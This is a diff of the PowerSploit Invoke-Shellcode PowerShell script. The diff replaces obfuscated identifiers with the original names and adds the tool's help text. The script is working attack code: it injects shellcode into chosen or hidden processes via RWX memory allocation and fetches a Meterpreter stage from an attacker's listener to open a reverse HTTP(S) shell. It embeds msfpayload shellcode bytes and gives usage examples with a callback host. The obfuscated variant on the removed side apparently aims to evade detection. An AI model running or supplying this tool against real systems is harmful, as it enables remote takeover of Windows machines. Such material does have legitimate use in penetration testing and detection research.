@@ -1,5 +1,147 @@
-function invokeshellcoderemote
+function Invoke-Shellcode
 {
+<#
+.SYNOPSIS
+
+Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.
+
+PowerSploit Function: Invoke-Shellcode
+Author: Matthew Graeber (@mattifestation)
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: None
+ 
+.DESCRIPTION
+
+Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre
+
+PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):
+
+msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
+
+Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
+ 
+.PARAMETER ProcessID
+
+Process ID of the process you want to inject shellcode into.
+
+.PARAMETER Shellcode
+
+Specifies an optional shellcode passed in as a byte array
+
+.PARAMETER ListMetasploitPayloads
+
+Lists all of the available Metasploit payloads that Invoke-Shellcode supports
+
+.PARAMETER Lhost
+
+Specifies the IP address of the attack machine waiting to receive the reverse shell
+
+.PARAMETER Lport
+ 
+Specifies the port of the attack machine waiting to receive the reverse shell
+
+.PARAMETER Payload
+
+Specifies the metasploit payload to use. Currently, only 'windows/meterpreter/reverse_http' and 'windows/meterpreter/reverse_https' payloads are supported.
+
+.PARAMETER UserAgent
+
+Optionally specifies the user agent to use when using meterpreter http or https payloads
+
+.PARAMETER Force
+
+Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.
+
+.EXAMPLE
+
+C:\PS> Invoke-Shellcode -ProcessId 4274
+
+Description
+-----------
+Inject shellcode into process ID 4274.
+
+.EXAMPLE
+
+C:\PS> Invoke-Shellcode
+
+Description
+-----------
+Inject shellcode into the running instance of PowerShell.
+
+.EXAMPLE
+
+C:\PS> Start-Process C:\Windows\SysWOW64\notepad.exe -WindowStyle Hidden
+C:\PS> $Proc = Get-Process notepad
+C:\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbose
+
+VERBOSE: Requesting meterpreter payload from https://192.168.30.129:443/INITM
+VERBOSE: Injecting shellcode into PID: 4004
+VERBOSE: Injecting into a Wow64 process.
+VERBOSE: Using 32-bit shellcode.
+VERBOSE: Shellcode memory reserved at 0x03BE0000
+VERBOSE: Emitting 32-bit assembly call stub.
+VERBOSE: Thread call stub memory reserved at 0x001B0000
+VERBOSE: Shellcode injection complete!
+
+Description
+-----------
+Establishes a reverse https meterpreter payload from within the hidden notepad process. A multi-handler was set up with the following options:
+
+Payload options (windows/meterpreter/reverse_https):
+
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
+LHOST     192.168.30.129   yes       The local listener hostname
+LPORT     443              yes       The local listener port
+
+.EXAMPLE
+
+C:\PS> Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 80
+
+Description
+-----------
+Establishes a reverse http meterpreter payload from within the running PwerShell process. A multi-handler was set up with the following options:
+
+Payload options (windows/meterpreter/reverse_http):
+
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
+LHOST     192.168.30.129   yes       The local listener hostname
+LPORT     80               yes       The local listener port
+
+.EXAMPLE
+
+C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
+    
+Description
+-----------
+Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
+Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
+    
+.EXAMPLE
+
+C:\PS> Invoke-Shellcode -ListMetasploitPayloads
+    
+Payloads
+--------
+windows/meterpreter/reverse_http
+windows/meterpreter/reverse_https
+
+.NOTES
+
+Use the '-Verbose' option to print detailed information.
+
+Place your generated shellcode in $Shellcode32 and $Shellcode64 variables or pass it in as a byte array via the '-Shellcode' parameter
+
+Big thanks to Oisin (x0n) Grehan (@oising) for answering all my obscure questions at the drop of a hat - http://www.nivot.org/
+
+.LINK
+
+http://www.exploit-monday.com
+#>
 
 [CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
     [ValidateNotNullOrEmpty()]
@@ -9,14 +151,14 @@ function invokeshellcoderemote
     [Parameter( ParameterSetName = 'RunLocal' )]
     [ValidateNotNullOrEmpty()]
     [Byte[]]
-    $adfdfgeh,
+    $Shellcode,
     
     [Parameter( ParameterSetName = 'Metasploit' )]
     [ValidateSet( 'windows/meterpreter/reverse_http',
                   'windows/meterpreter/reverse_https',
                   IgnoreCase = $True )]
     [String]
-    $dbadsoft = 'windows/meterpreter/reverse_http',
+    $Payload = 'windows/meterpreter/reverse_http',
     
     [Parameter( ParameterSetName = 'ListPayloads' )]
     [Switch]
@@ -26,7 +168,7 @@ function invokeshellcoderemote
                 ParameterSetName = 'Metasploit' )]
     [ValidateNotNullOrEmpty()]
     [String]
-    $aHost = '127.0.0.1',
+    $Lhost = '127.0.0.1',
     
     [Parameter( Mandatory = $True,
                 ParameterSetName = 'Metasploit' )]
@@ -51,9 +193,9 @@ function invokeshellcoderemote
         $AvailablePayloads = (Get-Command Invoke-Shellcode).Parameters['Payload'].Attributes |
             Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
     
-        foreach ($dbadsoft in $AvailablePayloads.ValidValues)
+        foreach ($Payload in $AvailablePayloads.ValidValues)
         {
-            New-Object PSObject -Property @{ Payloads = $dbadsoft }
+            New-Object PSObject -Property @{ Payloads = $Payload }
         }
         
         Return
@@ -188,39 +330,39 @@ function invokeshellcoderemote
             }
             elseif ($IsWow64) # 32-bit Wow64 process
             {
-                if ($adfdfgeh32.Length -eq 0)
+                if ($Shellcode32.Length -eq 0)
                 {
-                    Throw 'No shellcode was placed in the $adfdfgeh32 variable!'
+                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                 }
                 
-                $adfdfgeh = $adfdfgeh32
+                $Shellcode = $Shellcode32
                 Write-Verbose 'Injecting into a Wow64 process.'
                 Write-Verbose 'Using 32-bit shellcode.'
             }
             else # 64-bit process
             {
-                if ($adfdfgeh64.Length -eq 0)
+                if ($Shellcode64.Length -eq 0)
                 {
-                    Throw 'No shellcode was placed in the $adfdfgeh64 variable!'
+                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                 }
                 
-                $adfdfgeh = $adfdfgeh64
+                $Shellcode = $Shellcode64
                 Write-Verbose 'Using 64-bit shellcode.'
             }
         }
         else # 32-bit CPU
         {
-            if ($adfdfgeh32.Length -eq 0)
+            if ($Shellcode32.Length -eq 0)
             {
-                Throw 'No shellcode was placed in the $adfdfgeh32 variable!'
+                Throw 'No shellcode was placed in the $Shellcode32 variable!'
             }
             
-            $adfdfgeh = $adfdfgeh32
+            $Shellcode = $Shellcode32
             Write-Verbose 'Using 32-bit shellcode.'
         }
 
         # Reserve and commit enough memory in remote process to hold the shellcode
-        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $adfdfgeh.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         
         if (!$RemoteMemAddr)
         {
@@ -230,7 +372,7 @@ function invokeshellcoderemote
         Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
 
         # Copy shellcode into the previously allocated memory
-        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $adfdfgeh, $adfdfgeh.Length, [Ref] 0) | Out-Null
+        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null
 
         # Get address of ExitThread function
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
@@ -280,29 +422,29 @@ function invokeshellcoderemote
     function Local:Inject-LocalShellcode
     {
         if ($PowerShell32bit) {
-            if ($adfdfgeh32.Length -eq 0)
+            if ($Shellcode32.Length -eq 0)
             {
-                Throw 'No shellcode was placed in the $adfdfgeh32 variable!'
+                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                 return
             }
             
-            $adfdfgeh = $adfdfgeh32
+            $Shellcode = $Shellcode32
             Write-Verbose 'Using 32-bit shellcode.'
         }
         else
         {
-            if ($adfdfgeh64.Length -eq 0)
+            if ($Shellcode64.Length -eq 0)
             {
-                Throw 'No shellcode was placed in the $adfdfgeh64 variable!'
+                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                 return
             }
             
-            $adfdfgeh = $adfdfgeh64
+            $Shellcode = $Shellcode64
             Write-Verbose 'Using 64-bit shellcode.'
         }
     
         # Allocate RWX memory for the shellcode
-        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $adfdfgeh.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$BaseAddress)
         {
             Throw "Unable to allocate shellcode memory in PID: $ProcessID"
@@ -311,7 +453,7 @@ function invokeshellcoderemote
         Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"
 
         # Copy shellcode to RWX buffer
-        [System.Runtime.InteropServices.Marshal]::Copy($adfdfgeh, 0, $BaseAddress, $adfdfgeh.Length)
+        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
         
         # Get address of ExitThread function
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
@@ -352,7 +494,7 @@ function invokeshellcoderemote
         $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
         
         $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
-        $VirtualFree.Invoke($BaseAddress, $adfdfgeh.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
+        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
 
         Write-Verbose 'Shellcode injection complete!'
     }
@@ -425,7 +567,7 @@ function invokeshellcoderemote
         $Response = $True
         
         if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you know what you're doing?",
-               "About to download Metasploit payload '$($dbadsoft)' LHOST=$($aHost), LPORT=$($Lport)" ) ) ) { }
+               "About to download Metasploit payload '$($Payload)' LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
         
         if ( !$Response )
         {
@@ -433,7 +575,7 @@ function invokeshellcoderemote
             Return
         }
         
-        switch ($dbadsoft)
+        switch ($Payload)
         {
             'windows/meterpreter/reverse_http'
             {
@@ -449,7 +591,7 @@ function invokeshellcoderemote
         }
         
         # Meterpreter expects 'INITM' in the URI in order to initiate stage 0. Awesome authentication, huh?
-        $Request = "http$($SSL)://$($aHost):$($Lport)/INITM"
+        $Request = "http$($SSL)://$($Lhost):$($Lport)/INITM"
         Write-Verbose "Requesting meterpreter payload from $Request"
         
         $Uri = New-Object Uri($Request)
@@ -458,21 +600,21 @@ function invokeshellcoderemote
         
         try
         {
-            [Byte[]] $adfdfgeh32 = $WebClient.DownloadData($Uri)
+            [Byte[]] $Shellcode32 = $WebClient.DownloadData($Uri)
         }
         catch
         {
             Throw "$($Error[0].Exception.InnerException.InnerException.Message)"
         }
-        [Byte[]] $adfdfgeh64 = $adfdfgeh32
+        [Byte[]] $Shellcode64 = $Shellcode32
 
     }
     elseif ($PSBoundParameters['Shellcode'])
     {
         # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
         # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
-        [Byte[]] $adfdfgeh32 = $adfdfgeh
-        [Byte[]] $adfdfgeh64 = $adfdfgeh32
+        [Byte[]] $Shellcode32 = $Shellcode
+        [Byte[]] $Shellcode64 = $Shellcode32
     }
     else
     {
@@ -481,7 +623,7 @@ function invokeshellcoderemote
         # Insert your shellcode here in the for 0xXX,0xXX,...
         # 32-bit payload
         # msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread
-        [Byte[]] $adfdfgeh32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
+        [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                   0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                   0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                   0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
@@ -497,7 +639,7 @@ function invokeshellcoderemote
 
         # 64-bit payload
         # msfpayload windows/x64/exec CMD="calc" EXITFUNC=thread
-        [Byte[]] $adfdfgeh64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
+        [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                   0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                   0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                   0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
